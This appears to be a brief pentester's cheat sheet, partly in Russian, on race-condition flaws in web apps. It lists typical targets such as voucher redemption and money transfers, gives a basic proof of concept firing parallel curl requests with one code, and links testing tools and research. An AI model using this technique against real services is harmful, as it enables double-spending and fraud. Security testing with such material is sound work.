# Race Condition

## Типичные примеры

* transfer/withdraw
* redeem voucher
* apply discount
* review/rate
* login

## Base PoC

```
curl -X GET 'https://example.com/?code=123&user=1' & \
curl -X GET 'https://example.com/?code=123&user=2' & \
curl -X GET 'https://example.com/?code=123&user=3' & \
curl -X GET 'https://example.com/?code=123&user=4' & \
curl -X GET 'https://example.com/?code=123&user=5' & \
wait
```

## Some tools

Race-the-Web (Go):[ https://github.com/aaronhnatiw/race-the-web](https://github.com/aaronhnatiw/race-the-web)

racepwn (Python): [https://github.com/racepwn/racepwn](https://github.com/racepwn/racepwn)

## Статьи

Удержание там через gate штуку. Собственно, семпл из репы [https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race.py)

[https://bo0om.ru/race-condition-ru](https://bo0om.ru/race-condition-ru) и соотв тулза racepwn к ней

Доклад и статья Джеймса Китла:\
\- [https://www.youtube.com/watch?v=tKJzsaB1ZvI](https://www.youtube.com/watch?v=tKJzsaB1ZvI)\
\- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

